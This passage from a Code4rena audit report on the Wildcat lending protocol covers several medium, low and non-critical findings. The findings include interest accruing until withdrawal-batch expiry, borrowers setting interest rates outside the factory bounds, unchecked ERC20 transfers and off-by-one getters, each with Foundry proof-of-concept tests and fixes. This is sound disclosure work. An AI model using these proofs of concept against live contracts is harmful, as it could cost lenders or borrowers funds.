      }

      tmp.expiry = uint128(block.timestamp + 2 weeks);
    }
```

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/497#issuecomment-1803435735):**
 > Tricky one that we went over several times with wardens. 90% was presented here to illustrate the functionality of setting a higher reserve, rather than one we actually wanted to use. Turns out I misjudged the willingness to bikeshed this point. Not going to quibble over this being a medium, since it's on me and my documentation.
> 
> The relationship between APR and willingness to grant credit is not linear - a 20% decrease in APR may induce far more than that amount of deposits to exit. At the same time, however, insisting on a full return of assets for a small decrease renders the credit facility useless to the borrower, while still leaving them liable to pay interest - in that situation, they might as well force a market closed and restart a different one.
> 
> We've ultimately chosen to - for this first wave of markets - utilize the following formula:
> 
> `newReserve = max(max(100%, 2 * (oldRate - newRate)/oldRate)), oldReserve)`
> 
> As an example, reducing the lender APR of a market from 5% to 3% will require an 80% reserve ratio (twice the 40% relative difference), but if the previous ratio was higher than this, it persists. Meeting point between competing sets of interests.
> 
> We've implemented this over the course of a few commits, final result is shown below -
> 
> ![image](https://github-production-user-asset-6210df.s3.amazonaws.com/135237830/289646754-c03fa07f-b386-4f7d-9ce7-5d0d542c055a.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231211T192645Z&X-Amz-Expires=300&X-Amz-Signature=b27aabf3185df8f67e9a7aabd62d645b4cf7fcb7f440166ca828fda587d52bfa&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=0)
>
> ![image](https://github-production-user-asset-6210df.s3.amazonaws.com/135237830/289646804-dc2e6016-dbba-4e7e-b898-a0fb09a29b66.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20231211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231211T192749Z&X-Amz-Expires=300&X-Amz-Signature=5ccc433a7f3875e71fcf06c7b6576e7c75c3ca1e73385f67911646125380144e&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=0)


**[0xTheC0der (judge) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/497#issuecomment-1804305663):**
 > I understand the sponsor's dissatisfaction about those findings and appreciate the insightful comment, as well as the proposed formula which would avoid the issue. However, it's my duty to judge the issues with respect to this audit's codebase (source of truth).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/497#issuecomment-1810765652)**

***

## [[M-09] Pending withdrawal batch debt cannot be paid by the borrower until the cycle ends](https://github.com/code-423n4/2023-10-wildcat-findings/issues/365)
*Submitted by [hash](https://github.com/code-423n4/2023-10-wildcat-findings/issues/365)*

The borrower will have to pay the interest and fees until the end of the withdrawal cycle.

### Proof of Concept

To repay a lender who has requested for withdrawal, the borrower is supposed to transfer the assets to the market and call the `updateState()` function. But the `_getUpdatedState()` function inside the `updateState` doesn't process the withdrawal batch with the latest available assets unless the batch has been expired. 

<https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketBase.sol#L358-L388>

```solidity
  function _getUpdatedState() internal returns (MarketState memory state) {
    state = _state;
    // Handle expired withdrawal batch
    if (state.hasPendingExpiredBatch()) {
      uint256 expiry = state.pendingWithdrawalExpiry;
      // Only accrue interest if time has passed since last update.
      
       ...... more code 

      _processExpiredWithdrawalBatch(state);
    }

    // Apply interest and fees accrued since last update (expiry or previous tx)
    if (block.timestamp != state.lastInterestAccruedTimestamp) {
      (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state
        .updateScaleFactorAndFees(
          protocolFeeBips,
          delinquencyFeeBips,
          delinquencyGracePeriod,
          block.timestamp
        );
      emit ScaleFactorUpdated(state.scaleFactor, baseInterestRay, delinquencyFeeRay, protocolFee);
    }
  }
```

This will lead to the borrower paying the interest and fees, even though the pending withdrawal debt has been repaid to the market.

### Demo

Add the following file in the test folder and run `forge test --mt testBorrowerHasToPayInterestTillTheCycleEndEvenAfterReturningAsset`:

<details>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import { MockERC20 } from 'solmate/test/utils/mocks/MockERC20.sol';

import './shared/Test.sol';
import './helpers/VmUtils.sol';
import './helpers/MockController.sol';
import './helpers/ExpectedStateTracker.sol';
import {MarketStateLib} from "../src/libraries/MarketState.sol";

contract TestPending is Test {
  using stdStorage for StdStorage;
  using FeeMath for MarketState;
  using SafeCastLib for uint256;

  MockERC20 internal asset;

  function setUp() public {
    setUpContracts(false);
  }

  function setUpContracts(bool disableControllerChecks) internal {
    if (address(controller) == address(0)) {
      deployController(borrower, false, disableControllerChecks);
    }
  }

  MarketParameters internal parameters;

  function testBorrowerHasToPayInterestTillTheCycleEndEvenAfterReturningAsset() public {
    uint32 withdrawalBatchDuration =  DefaultWithdrawalBatchDuration; // 86400
    uint16  delinquencyFee = DefaultDelinquencyFee;
    uint32  gracePeriod =  DefaultGracePeriod;
    
    parameters =
    MarketParameters({
      asset: address(0),
      namePrefix: 'Wildcat ',
      symbolPrefix: 'WC',
      borrower: borrower,
      controller: address(0),
      feeRecipient: feeRecipient,
      sentinel: address(sanctionsSentinel),
      maxTotalSupply: uint128(DefaultMaximumSupply),
      protocolFeeBips: DefaultProtocolFeeBips,
      annualInterestBips: DefaultInterest,
      delinquencyFeeBips: delinquencyFee,
      withdrawalBatchDuration: withdrawalBatchDuration,
      reserveRatioBips: DefaultReserveRatio,
      delinquencyGracePeriod: gracePeriod
    });

    parameters.controller = address(controller);
    parameters.asset = address(asset = new MockERC20('Token', 'TKN', 18));
    deployMarket(parameters);
    _authorizeLender(alice);
    asset.mint(alice, type(uint128).max);
    asset.mint(bob, type(uint128).max);

    _approve(alice, address(market), type(uint256).max);
    _approve(bob, address(market), type(uint256).max);

    
        uint256 availableCollateral = market.borrowableAssets();
        assertEq(availableCollateral, 0, 'borrowable should be 0');
    
        vm.prank(alice);
        market.depositUpTo(50_000e18);
        assertEq(market.borrowableAssets(), 40_000e18, 'borrowable should be 40k');
        vm.prank(borrower);
        market.borrow(40_000e18);
        assertEq(asset.balanceOf(borrower), 40_000e18);
      
        // alice requests to withdraw the deposit
        vm.prank(alice);
        market.queueWithdrawal(50_000e18);

        // 10_000 is filled with alices own amount. due to remaining the market has become delinquent
        assertEq(market.currentState().isDelinquent,true);

        uint128 normalizedUnclaimedWithdrawals = market.currentState().normalizedUnclaimedWithdrawals;        
        uint256 pendingDebt = market.totalSupply();
        assertEq(normalizedUnclaimedWithdrawals,10_000e18);
        assertEq(pendingDebt,40_000e18);

      // borrower deposits the debt back to avoid the delinquency fee. 
        vm.prank(borrower);
        asset.transfer(address(market),40_000e18);
        market.updateState();
        
        // but since not expired, the pending withdrawal debt is not closed making the borrower pay interest till the cycle end
        assertEq(market.totalSupply(),pendingDebt); 
       
        fastForward(withdrawalBatchDuration);
        market.updateState();

        // when expriy time passes the pending withdrawal debt will be matched with repayed debt and the protocol fee. but interest generated by this amount still remains
        uint initialTotalAmount = normalizedUnclaimedWithdrawals + pendingDebt;
        assertEq(market.currentState().normalizedUnclaimedWithdrawals + market.currentState().accruedProtocolFees,initialTotalAmount);
        uint extraDebtFromInterestExculdingTheProtocolFee = market.totalSupply();

        assertGt(extraDebtFromInterestExculdingTheProtocolFee,0);
        
  }

  function _authorizeLender(address account) internal asAccount(parameters.borrower) {
    address[] memory lenders = new address[](1);
    lenders[0] = account;
    controller.authorizeLenders(lenders);
  }

 

  function _approve(address from, address to, uint256 amount) internal asAccount(from) {
    asset.approve(to, amount);
  }
}
```
</details>

### Recommended Mitigation Steps

Use `_applyWithdrawalBatchPayment()` in `_getUpdatedState()` similar to the implementation in `queueWithdrawal()`.

### Assessed type

Timing

**[d1ll0n (Wildcat) acknowledged](https://github.com/code-423n4/2023-10-wildcat-findings/issues/365#issuecomment-1788824016)**

***

## [[M-10] Function `WildcatMarketController.setAnnualInterestBips` allows for values outside the factory range](https://github.com/code-423n4/2023-10-wildcat-findings/issues/196)
*Submitted by [3docSec](https://github.com/code-423n4/2023-10-wildcat-findings/issues/196), also found by [stackachu](https://github.com/code-423n4/2023-10-wildcat-findings/issues/728), [serial-coder](https://github.com/code-423n4/2023-10-wildcat-findings/issues/646), [Toshii](https://github.com/code-423n4/2023-10-wildcat-findings/issues/613), [josephdara](https://github.com/code-423n4/2023-10-wildcat-findings/issues/604), [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/496), [gizzy](https://github.com/code-423n4/2023-10-wildcat-findings/issues/456), [smiling\_heretic](https://github.com/code-423n4/2023-10-wildcat-findings/issues/443), [TrungOre](https://github.com/code-423n4/2023-10-wildcat-findings/issues/412), [Tricko](https://github.com/code-423n4/2023-10-wildcat-findings/issues/387), [0xbrett8571](https://github.com/code-423n4/2023-10-wildcat-findings/issues/350), [ZdravkoHr](https://github.com/code-423n4/2023-10-wildcat-findings/issues/318), [deth](https://github.com/code-423n4/2023-10-wildcat-findings/issues/298), [joaovwfreire](https://github.com/code-423n4/2023-10-wildcat-findings/issues/289), [caventa](https://github.com/code-423n4/2023-10-wildcat-findings/issues/272), [0xbepresent](https://github.com/code-423n4/2023-10-wildcat-findings/issues/244), [b0g0](https://github.com/code-423n4/2023-10-wildcat-findings/issues/229), [ggg\_ttt\_hhh](https://github.com/code-423n4/2023-10-wildcat-findings/issues/213), [Eigenvectors](https://github.com/code-423n4/2023-10-wildcat-findings/issues/202), [cu5t0mpeo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/90), and [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/85)*

When a `WildcatMarketController` is created, it is hardcoded with a `MinimumAnnualInterestBips` and `MaximumAnnualInterestBips` range that cannot be changed; these values come from `WildcatMarketControllerFactory` where they are specified by the protocol owners.

When a market is created at the borrower's request, the annual interest requested by the borrower is validated to sit within these bounds.

However, the borrower is also allowed to change this value at a later point through the `WildcatMarketController.setAnnualInterestBips` function. This entry point does not offer any validation, except for the downstream `WildcatMarket.setAnnualInterestBips` that checks for the value not to exceed `BIPS`.

### Impact

After the creation of a market, the borrower is allowed to change its annual interest outside the bounds allowed by the protocol.

### Proof of Concept

```Solidity
    function testArbitraryInterestRate() public {
        WildcatArchController archController = new WildcatArchController();
        SanctionsList sanctionsList = new SanctionsList();
        WildcatSanctionsSentinel sentinel = new WildcatSanctionsSentinel(
            address(archController), 
            address(sanctionsList));


        // the protocol mandates a 10% annual interest
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController), // _archController,
            address(sentinel), // _sentinel,
            MarketParameterConstraints( // constraints
                uint32(0), // minimumDelinquencyGracePeriod;
                uint32(0), // maximumDelinquencyGracePeriod;
                uint16(0), // minimumReserveRatioBips;
                uint16(0), // maximumReserveRatioBips;
                uint16(0), // minimumDelinquencyFeeBips;
                uint16(0), // maximumDelinquencyFeeBips;
                uint32(0), // minimumWithdrawalBatchDuration;
                uint32(0), // maximumWithdrawalBatchDuration;
                uint16(10_00), // minimumAnnualInterestBips;
                uint16(10_00)  // maximumAnnualInterestBips;
            )
        );

        address borrower = address(uint160(uint256(keccak256("borrower"))));

        archController.registerBorrower(borrower);
        archController.registerControllerFactory(address(controllerFactory));

        MockERC20 token = new MockERC20();

        vm.startPrank(borrower);
        WildcatMarketController controller = WildcatMarketController(
            controllerFactory.deployController());

        // the borrower creates a market with 10% annual interest - all good till now
        address market = controller.deployMarket(
            address(token), // asset,
            "3d", // namePrefix,
            "3", // symbolPrefix,
            type(uint128).max, // maxTotalSupply,
            10_00, // annualInterestBips
            0, // delinquencyFeeBips,
            0, // withdrawalBatchDuration,
            0, // reserveRatioBips,
            0 // delinquencyGracePeriod
        );

        // now, the borrower is allowed to change the interest below 10%
        // which is not allowed by the protocol config
        controller.setAnnualInterestBips(market, 5_00);

        // and get away with it
        assertEq(5_00, WildcatMarket(market).annualInterestBips());
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Consider introducing the validation of the new interest rate:

```diff
  // WildcatMarketController.sol:468
  function setAnnualInterestBips(
    address market,
    uint16 annualInterestBips
  ) external virtual onlyBorrower onlyControlledMarket(market) {
+   assertValueInRange(
+     annualInterestBips,
+     MinimumAnnualInterestBips,
+     MaximumAnnualInterestBips,
+     AnnualInterestBipsOutOfBounds.selector
+   );
    // If borrower is reducing the interest rate, increase the reserve
    // ratio for the next two weeks.
```

### Assessed type

Invalid Validation

**[laurenceday (Wildcat) commented](https://github.com/code-423n4/2023-10-wildcat-findings/issues/196#issuecomment-1803487206):**
 > Mitigated [here](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/6cd7317416aa01548051c71a287ac1b3756bf2cc), adjusted to proposed solution with [this commit](https://github.com/wildcat-finance/wildcat-protocol/pull/57/commits/acb3d5950fc4986613b639f90d3a34a3aa27872b).

**[laurenceday (Wildcat) confirmed](https://github.com/code-423n4/2023-10-wildcat-findings/issues/196#issuecomment-1810764031)**

***

## [[M-11] Return values of `transfer()`/`transferFrom()` not checked and unsafe usage](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c)

*Submitted by [henry](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c)*

*Note: This finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c). It was declared out of scope for the audit, but is being included here for completeness.*

### [Return values not checked](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c#m02-return-values-of-transfertransferfrom-not-checked)

Not all ERC20 implementations `revert()` when there's a failure in `transfer()` or `transferFrom()`. The function signature has a boolean return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually transfer anything.

### [Unsafe usage](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c#m03-unsafe-use-of-erc20-transfertransferfrom)
Some tokens do not implement the ERC20 standard properly. For example, Tether (USDT)'s `transfer()` and `transferFrom()` functions do not return booleans as the ERC20 specification requires, and instead have no return value. When these sorts of tokens are cast to IERC20/ERC20, their function signatures do not match and therefore the calls made will revert.
It is recommended to use the [`SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f347b410cf6aeeaaf5197e1fece139c793c03b2b/contracts/token/ERC20/utils/SafeERC20.sol#L19)'s `safeTransfer()` and `safeTransferFrom()` from OpenZeppelin instead.

### Instances
*There is 1 instance of these issues:*

WildcatSanctionsEscrow.sol ([#L38](https://github.com/code-423n4/2023-10-wildcat/blob/bbeea97c94114731d809674546210b5a56d7bc6c/src/WildcatSanctionsEscrow.sol#L38))

```solidity
38:     IERC20(asset).transfer(account, amount);
```

**[laurenceday (Wildcat) confirmed and commented](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c?permalink_comment_id=4781687#gistcomment-4781687)**:
> Fixed by utilising `SafeERC20`.

**[0xTheC0der (judge) commented](https://gist.github.com/code423n4/265e1707379b9a3f89cf18aa0bffcb7c?permalink_comment_id=4781801#gistcomment-4781801):**
> Even checking the return values of ERC-20 transfers is problematic and insufficient due to popular tokens like USDT deviating from the spec. One always has to use SafeERC20 (as already mentioned by the sponsor), otherwise this is a valid Medium severity finding.
>
> However, there is an exception in case the transferred tokens cannot be chosen freely by the users but need to be whitelisted. Also there are occasions where only a protocol's own correctly implemented tokens can be used (Wildcat market tokens for example). In these cases, the severity is only Informational, since no malfunction can occur.
>
> In case of Wildcat, if I remember correctly, the `WildcatSanctionsEscrow` contract could hold user-defined assets and not only their own market tokens. Therefore, Medium severity is justified.

***

# Low Risk and Non-Critical Issues

For this audit, 42 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-10-wildcat-findings/issues/581) by **J4X** received the top score from the judge.

*The following wardens also submitted reports: [radev\_sw](https://github.com/code-423n4/2023-10-wildcat-findings/issues/659), [serial-coder](https://github.com/code-423n4/2023-10-wildcat-findings/issues/614), [VAD37](https://github.com/code-423n4/2023-10-wildcat-findings/issues/573), [MiloTruck](https://github.com/code-423n4/2023-10-wildcat-findings/issues/533), [osmanozdemir1](https://github.com/code-423n4/2023-10-wildcat-findings/issues/382), [t0x1c](https://github.com/code-423n4/2023-10-wildcat-findings/issues/279), [3docSec](https://github.com/code-423n4/2023-10-wildcat-findings/issues/237), [ggg\_ttt\_hhh](https://github.com/code-423n4/2023-10-wildcat-findings/issues/220), [inzinko](https://github.com/code-423n4/2023-10-wildcat-findings/issues/725), [0xbepresent](https://github.com/code-423n4/2023-10-wildcat-findings/issues/718), [Fulum](https://github.com/code-423n4/2023-10-wildcat-findings/issues/717), [Phantom](https://github.com/code-423n4/2023-10-wildcat-findings/issues/699), [0xComfyCat](https://github.com/code-423n4/2023-10-wildcat-findings/issues/664), [Udsen](https://github.com/code-423n4/2023-10-wildcat-findings/issues/663), [DeFiHackLabs](https://github.com/code-423n4/2023-10-wildcat-findings/issues/638), [nonseodion](https://github.com/code-423n4/2023-10-wildcat-findings/issues/635), [Mike\_Bello90](https://github.com/code-423n4/2023-10-wildcat-findings/issues/632), [devival](https://github.com/code-423n4/2023-10-wildcat-findings/issues/597), [karanctf](https://github.com/code-423n4/2023-10-wildcat-findings/issues/585), [DavidGiladi](https://github.com/code-423n4/2023-10-wildcat-findings/issues/554), [jasonxiale](https://github.com/code-423n4/2023-10-wildcat-findings/issues/519), [ast3ros](https://github.com/code-423n4/2023-10-wildcat-findings/issues/513), [josieg\_74497](https://github.com/code-423n4/2023-10-wildcat-findings/issues/486), [ZdravkoHr](https://github.com/code-423n4/2023-10-wildcat-findings/issues/322), [deth](https://github.com/code-423n4/2023-10-wildcat-findings/issues/320), [ke1caM](https://github.com/code-423n4/2023-10-wildcat-findings/issues/296), [0xStalin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/275), [YusSecurity](https://github.com/code-423n4/2023-10-wildcat-findings/issues/269), [0x3b](https://github.com/code-423n4/2023-10-wildcat-findings/issues/264), [GREY-HAWK-REACH](https://github.com/code-423n4/2023-10-wildcat-findings/issues/242), [caventa](https://github.com/code-423n4/2023-10-wildcat-findings/issues/215), [Drynooo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/185), [nisedo](https://github.com/code-423n4/2023-10-wildcat-findings/issues/169), [SHA\_256](https://github.com/code-423n4/2023-10-wildcat-findings/issues/160), [deepkin](https://github.com/code-423n4/2023-10-wildcat-findings/issues/115), [InAllHonesty](https://github.com/code-423n4/2023-10-wildcat-findings/issues/101), [0xCiphky](https://github.com/code-423n4/2023-10-wildcat-findings/issues/83), [rvierdiiev](https://github.com/code-423n4/2023-10-wildcat-findings/issues/76), [nobody2018](https://github.com/code-423n4/2023-10-wildcat-findings/issues/57), [MatricksDeCoder](https://github.com/code-423n4/2023-10-wildcat-findings/issues/47), and [T1MOH](https://github.com/code-423n4/2023-10-wildcat-findings/issues/46).*

## Low Issues 

## [L-01] Lenders can also deposit when not authorized on the controller
[WildcatMarketController Line 169](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L169)

### Issue Description

The audit description incorrectly states that "Lenders that are authorized on a given controller (i.e. granted a role) can deposit assets to any markets that have been launched through it.". However, this is not the case as borrowers need to call `updateLenderAuthorization()` when deauthorizing a lender. If a borrower forgets to call this function, the lender can be deauthorized on the controller but still deposit new funds into the market until the lender or someone else calls `updateLenderAuthorization`.

### Recommended Mitigation Steps

It is recommended to update the documentation to state that this is only correct if `updateLenderAuthorization()` was called afterward. If the intent is to have the functionality work as described in the audit description, an atomic removal of lenders would need to be implemented.

## [L-02] No controllers can be deployed if certain tokens are chosen as `feeAsset`

[WildcatMarketController Line 345](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L345)

### Issue Description

The `MarketControllerFactory` allows for setting an `originationFeeAsset`, as well as `originationFeeAmount`, which are used to send a fee to the recipient each time a new market is deployed. When a market is deployed, the `originationFeeAmount` of the `originationFeeAsset` is transferred from the borrower to the `feeRecipient`. There is one additional check in place that verifies if the `originationFeeAsset` address is `0` and only transfers a fee if it is not zero.

```solidity
if (originationFeeAsset != address(0)) {
	originationFeeAsset.safeTransferFrom(borrower, parameters.feeRecipient, originationFeeAmount);
}
```

The issue with this implementation is that some tokens, like [LEND](https://www.coingecko.com/de/munze/aave-old), may revert in case of a zero transfer. This means that if a token like [LEND](https://www.coingecko.com/de/munze/aave-old) is set as the `originationFeeAsset`, and later on the fee is reduced to zero, this function will always fail to execute, preventing any new markets from being deployed.

Additionally, not checking for zero transfers could lead to gas waste in the case of a token that does not revert but simply transfers nothing during a zero transfer.

### Recommended Mitigation Steps

To fix this issue, an additional check needs to be added to the `if` clause, ensuring that `originationFeeAmount` is greater than zero:

```solidity
if (originationFeeAsset != address(0) && originationFeeAmount > 0) {
	originationFeeAsset.safeTransferFrom(borrower, parameters.feeRecipient, originationFeeAmount);
}
```

## [L-03] `getDeployedControllers()` will not return the last index

[WildcatMarketControllerFactory Line 138](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketControllerFactory.sol#L138)

### Issue Description

The `getDeployedControllers()` function takes a start and end index of the controllers to be retrieved. However, due to the current implementation of the function, it only returns controllers from the start index to `end-1`. In other words, the controller at the `end` index is not included in the returned list. 

### POC

This simple POC can be added to the `WIldcatMarketController` test to check for the issue.

```solidity
function test_getControllers() external {
//Deploy 10 contracts
	for(uint256 i = 0; i < 10; i++)
	{
		controllerFactory.deployController();
	}
	  
	//Want to access 2-7 (6 controllers)
	address[] memory controllers = controllerFactory.getDeployedControllers(2, 7);
	
	//Check that the length is correct
	require(controllers.length == 5, "We have not received an incorrect number");
	
	//We only received controllers 2-6 due to the implementation
}
```

The same issue also exists in the functions:
- `WildcatMarketController.getAuthorizedLenders()`
- `WildcatMarketController.getControlledMarkets()`
- `WildcatArchController.getRegisteredBorrowers()`
- `WildcatArchController.getRegisteredControllerFactories()`
- `WildcatArchController.getRegisteredControllers()`
- `WildcatArchController.getRegisteredMarkets()`

### Recommended Mitigation Steps

To resolve this issue, the `getDeployedControllers()` function should be rewritten as follows:

```solidity
function getDeployedControllers(
uint256 start,
uint256 end
) external view returns (address[] memory arr) {
	uint256 len = _deployedControllers.length();
	end = MathUtils.min(end, len-1);
	uint256 count = end - start + 1;
	arr = new address[](count);
	for (uint256 i = 0; i < count; i++) {
		arr[i] = _deployedControllers.at(start + i);
	}
}
```

The same change should be applied to other affected functions as well.

## [L-04] Rebasing tokens will lead to borrowers needing to pay a lower APR

### Issue Description

Rebasing tokens, which are not excluded from the audit, can be used as underlying assets for markets deployed using the protocol. Rebasing tokens can be implemented in various ways, but the critical point is when the balance of addresses holding the tokens gradually increases. As borrowers/market contracts hold these tokens while they are lent, the newly accrued tokens may either be credited to the borrower, or inside the market itself, which would count as the borrower adding liquidity. This can result in the borrower needing to pay a lower Annual Percentage Rate (APR) than initially set.

### Recommended Mitigation Steps

This issue can be mitigated in several ways:

**Option 1:** Disallow rebasing tokens from the protocol to prevent this situation.

**Option 2:** Add a warning to the documentation, informing users that when lending rebasing tokens, the rebasing interest their tokens gain while inside the market will be counted as the borrower paying down their debt.

**Option 3 (Complicated):** Implement functionality for rebasing tokens by checking the market's balance at each interaction and adding the change to a separate variable that tracks rebasing awards.

## [L-05] Reserve ratio can be set to 100%

[MarketControllerFactory Line 85](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/WildcatMarketControllerFactory.sol#L85)

### Issue Description

The protocol allows borrowers to set a reserve ratio that they must maintain to avoid being charged a delinquency fee. In the current implementation, this parameter can be set to 100%, rendering the entire functionality redundant, as borrowers would not be able to withdraw any funds from the market. Additionally,  the market would fall into delinquency immediately after the start.

### Recommended Mitigation Steps

To mitigate this issue, modify the check on `maximumReserveRatioBips` to revert if `constraints.maximumReserveRatioBips >= 10000`.

## [L-06] `scaleFactor` can theoretically overflow

[FeeMath Line 169](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/libraries/FeeMath.sol#L169)

### Issue Description

The `scaleFactor` of a market is multiplied by the fee rate to increase the scale. In a very rare edge case, where a market has a 100% interest (e.g., a junk bond) and is renewed each year with the borrower paying lenders the full interest, the scale factor would overflow after 256 years (as the scale factor doubles every year) when it attempts to increase during the withdrawal amount calculation.

### Recommended Mitigation Steps

While this issue is unlikely to occur in practice, a check should be added in the withdrawal process to prevent an overflow. If an overflow is detected, lenders should be forced to withdraw with a scale factor of `uint256.max`, and the borrower should close the market.

## [L-07] Misleading ERC20 queries `balanceOf()` and `totalSupply()`

[WildcatMarketToken Line 16](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketToken.sol#L16)

[WildcatMarketToken Line 22](https://github.com/code-423n4/2023-10-wildcat/blob/c5df665f0bc2ca5df6f06938d66494b11e7bdada/src/market/WildcatMarketToken.sol#L22)

### Issue Description

The `WildcatMarketToken` contract includes standard `ERC20` functions, `balanceOf()` and `totalSupply()`. However, these functions return the balance of the underlying tokens instead of the market tokens. This discrepancy between the function names and their actual behavior could lead to confusion or issues when interacting with other protocols.

### Recommended Mitigation Steps

To address this issue, it is recommended to rename the existing functions to `balanceOfScaled()` and `totalScaledSupply()`, and additionally implement `balanceOf()` and `totalSupply()` functions that return the balance of the market token.

## [L-08] Closed markets can't be reopened

[WildcatMarket Line 142](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L142)

### Issue Description

Markets include a functionality where users can close markets directly, effectively transferring all funds back into the market and setting the `isClosed` parameter of the state to true. While this prevents new lenders from depositing into the market, it only allows lenders to withdraw their funds and interest. The issue is that, once a borrower uses this function, the market cannot be reopened. If the borrower wants to have another market for the same asset, they must deploy a new market with a new prefix to avoid salt collisions. If a borrower does this often it might end up in the Market names looking like "CodearenaV1234.56DAI" due to new prefixes being needed each time. Additionally, the markets list would get more and more bloated. 

### Recommended Mitigation Steps

To mitigate this issue, borrowers should be allowed to reset a market. This would require all lenders to withdraw their funds before the reset, but it would reset all parameters, including the scale factor, allowing the market to be restarted.

## [L-09] Choosable prefix allows borrowers to mimic other borrowers.

[WildcatMarketBase Line 97](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L97)

### Issue Description

When a new market is deployed, its name and prefix are generated by appending the underlying asset's name and symbol to the name and symbol prefixes provided by the borrower. In the audit description, this is explained as Code4rena deploying a market and passing Code4rena as name prefix and C4 as symbol prefix.

A malicious borrower could exploit this functionality to deploy markets for other well-known assets with the same Code4rena prefixes, potentially tricking lenders into lending them money and mimicking other borrowers. This could lead to confusion and potentially fraudulent activities.

### Recommended Mitigation Steps

The recommended solution for this is to let each borrower choose a borrower identifier (that gets issued to them by Wildcat). This, in the Code4rena example, would be the "Code4rena" and "C4" strings. Now the hashes (hashes instead of strings to save gas on storage cost) of those identifiers get stored onchain whenever a new borrower gets added. Whenever Code4rena deploys a new market they pass their identifier, as well as a chosen Postfix, which would allow them to deploy multiple markets for the same asset (for example, with different interest rates). The protocol then verifies if the identifiers match the hash and revert if that is not the case. The market mame would then, for example, look like this "Code4renaShortTermDAI".

## [L-10] Interest continues to accrue up to the expiry.

### Issue Description

The whitepaper on page 12 states that interest ceases to be paid at the time when tokens get burned or when withdrawals are queued in the line "Interest ceases to be paid on Bob's deposit from the moment that the whcWETH tokens were burned, regardless of the length of the withdrawal cycle".

However, the actual code behavior differs. In the Wildcat protocol's implementation, interest continues to accrue until the expiration of the withdrawal period, as evident in the code snippet below:

```solidity
if (state.hasPendingExpiredBatch()) {
  uint256 expiry = state.pendingWithdrawalExpiry;
  // Interest accrual only if time has passed since last update.
  // This condition is only false when withdrawalBatchDuration is 0.
  if (expiry != state.lastInterestAccruedTimestamp) {
    (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state
      .updateScaleFactorAndFees(
        protocolFeeBips,
        delinquencyFeeBips,
        delinquencyGracePeriod,
        expiry
      );
    emit ScaleFactorUpdated(state.scaleFactor, baseInterestRay, delinquencyFeeRay, protocolFee);
  }
  _processExpiredWithdrawalBatch(state);
}
```

### Recommended Mitigation Steps

To address this issue, there are two potential courses of action:

1. If the intended behavior is for interest to continue accruing until the withdrawal period expires, then the documentation should be updated to align with the current code behavior.

2. If the documentation accurately reflects the intended interest-accrual behavior (i.e., interest should stop accruing when withdrawals are queued), then the conditional statement as shown in the code snippet should be removed from the function `_getUpdatedState()`.

***

## Non-Critical Issues

## [N-01] Badly named constant `BIP`

[MathUtils Line 6](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/MathUtils.sol#L6)

### Issue Description

The variable `BIP` is used to represent the maximum BIP in the protocol, where at most different rates can be set to 10,000, equivalent to 100%. The variable name could be misleading, as it may incorrectly suggest that it represents one BIP, which should be equal to 1.

### Recommended Mitigation Steps

To enhance clarity, rename the variable to `MAX_BIP`.

## [N-02] Incorrect documentation on capacity resizing

### Issue Description

The whitepaper (on page 5) states that the "maximum capacity of a vault can be adjusted at will up or down by the borrower depending on the current need." However, the `maxCapacity` can only be reduced down to the current liquidity inside the market, as per the code. This discrepancy between the documentation and the code could lead to a misunderstanding.

```solidity
if (_maxTotalSupply < state.totalSupply()) {
	revert NewMaxSupplyTooLow();
}
```

### Recommended Mitigation Steps

Revise the whitepaper to accurately reflect that the "maximum capacity of a vault can be adjusted at will, but only down to the current supply of the market."

## [N-03] Incorrect documentation on authentication process

[Whitepaper, page 7](https://github.com/wildcat-finance/wildcat-whitepaper/blob/main/whitepaper_v0.2.pdf)
